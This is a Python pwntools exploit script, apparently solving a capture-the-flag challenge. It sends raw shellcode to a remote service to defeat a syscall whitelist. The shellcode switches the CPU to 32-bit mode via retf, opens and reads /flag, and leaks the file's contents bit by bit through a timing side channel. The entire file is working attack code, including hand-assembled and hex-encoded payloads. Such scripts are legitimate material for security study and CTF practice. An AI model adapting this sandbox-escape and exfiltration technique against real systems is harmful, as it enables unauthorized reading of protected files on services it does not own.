# -*- coding: utf-8 -*-
from pwn import *
from time import time
context.arch = "amd64"
r = None

if len(sys.argv) < 3:
    print("Usage: python %s IP PORT" % sys.argv[0])
    exit(1)


def challenge(ip, port):
    DEBUG = 0

    if DEBUG:
        r = remote(ip, port)
        read_main = 0xC0DE044
        leave = 0xC0DE062
        rsp = 0xC0DE700
        shellcode_x86_addr = 0xC0DE100
        shellcode_x64_addr = 0xC0DE200
        flag_path_addr = 0xC0DE300
        flag_content_addr = 0xC0DE800

        r.recvline()  # Whitelist: socket, preadv, exit_group, exit, read, sendmsg, setsockopt, exit_group, exit, lstat, getegid, capget, lgetxattr, chmod, getcwd, chdir
        r.recvline()  # Read flag at /flag!
        payload = fit(leave, chr(read_main & 0xff))
        shellcode_read_more = """
        mov dx, 0x500
        mov al, 0
        syscall
        """
        shellcode_read_more = asm(shellcode_read_more, arch='amd64', bits=64)
        shellcode_read_more = shellcode_read_more.ljust(0x9, "\x90")
        payload += shellcode_read_more

        shellcode_switch_x86 = """
        mov rsp, %d
        mov DWORD PTR [rsp], %d
        mov DWORD PTR [rsp+4], 0x23
        retf
        """ % (rsp, shellcode_x86_addr)

        shellcode_switch_x86 = "\x90" * \
            (0xc0de06a-0xc0de062) + asm(shellcode_switch_x86, arch='amd64', bits=64)
        shellcode_switch_x86 = shellcode_switch_x86.ljust(
            0xc0de100-0xc0de062, "\x90")

        shellcode_x86 = """
        mov eax, 295
        mov ebx, 0xffffffff
        mov ecx, %d
        mov edx, 0
        int 0x80
        mov esp, %d
        mov DWORD PTR [esp], %d
        mov DWORD PTR [esp+4], 0x33
        retf
        """ % (flag_path_addr, rsp, shellcode_x64_addr)
        shellcode_x86 = asm(shellcode_x86, arch='i386', bits=32).ljust(
            0xc0de200-0xc0de100, "\x90")

        idx = 0
        bit_check = 1

        shellcode_x64 = """
        mov rax, 0
        mov rdi, 3
        mov rsi, %d
        mov rdx, 0x1000
        syscall
        mov rcx, %d
        mov rax, %d
        mov bl, BYTE PTR [rax+rcx]
        shr bl, %d
        and bl, 0x1
        cmp bl, 0
        jne exit
        loop:
            jmp $
        exit:
            mov rax, 60
            syscall
        """ % (flag_content_addr, idx, flag_content_addr, bit_check)

        shellcode_x64 = asm(shellcode_x64, arch='amd64', bits=64).ljust(
            0xc0de300-0xc0de200, "\x90")

        payload += shellcode_switch_x86
        payload += shellcode_x86
        payload += shellcode_x64
        payload += "/etc/passwd\x00"
        r.send(payload)
        s = time()
        r.recvall(timeout=0.5)
        log.info("time: %f" % (time()-s))
        r.interactive()
    else:
        idx = 0
        flag = ""
        context.log_level = 'critical'

        while 1:
            flag_char = 0
            for bit_check in range(7):
                r = remote(ip, port)
                r.recvuntil("Read flag at /flag\n")
                payload = "\x62\xe0\x0d\x0c\x00\x00\x00\x00\x44\x66\xba\x00\x05\xb0\x00\x0f\x05\x90\x90\x90\x90\x90\x90\x90\x90\x90\x48\xc7\xc4\x00\xe7\x0d\x0c\xc7\x04\x24\x00\xe1\x0d\x0c\xc7\x44\x24\x04\x23\x00\x00\x00\xcb\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xb8\x27\x01\x00\x00\xbb\xff\xff\xff\xff\xb9\x00\xe3\x0d\x0c\xba\x00\x00\x00\x00\xcd\x80\xbc\x00\xe7\x0d\x0c\xc7\x04\x24\x00\xe2\x0d\x0c\xc7\x44\x24\x04\x33\x00\x00\x00\xcb\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x48\xc7\xc0\x00\x00\x00\x00\x48\xc7\xc7\x03\x00\x00\x00\x48\xc7\xc6\x00\xe8\x0d\x0c\x48\xc7\xc2\x00\x10\x00\x00\x0f\x05\x48\xc7\xc1" + \
                    chr(idx) + "\x00\x00\x00\x48\xc7\xc0\x00\xe8\x0d\x0c\x8a\x1c\x08\xc0\xeb" + chr(bit_check) + "\x80\xe3\x01\x80\xfb\x00\x75\x02\xeb\xfe\x48\xc7\xc0\x3c\x00\x00\x00\x0f\x05\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"+"/flag\x00"
                r.send(payload)
                s = time()
                to = 0.5
                r.recvall(timeout=to)
                if time()-s < to:
                    flag_char += 2**bit_check
            if flag_char == 0:
                exit()
            idx += 1
            flag += chr(flag_char)
            print(flag)


challenge(sys.argv[1], int(sys.argv[2]))
